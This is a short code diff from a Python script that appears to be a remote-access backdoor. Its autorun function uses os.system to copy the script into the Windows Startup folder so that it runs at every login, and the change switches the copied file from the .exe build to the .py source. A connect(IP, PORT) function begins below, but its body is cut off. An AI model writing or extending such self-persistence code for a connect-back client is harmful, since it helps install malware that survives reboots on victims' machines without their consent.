@@ -11,7 +11,7 @@ def autorun():
     filename = os.path.basename(__file__)
     exe_filename = filename.replace(".py", ".exe")
     print(filename)
-    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(exe_filename))
+    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(filename))
 
 def connect(IP, PORT):
     try:
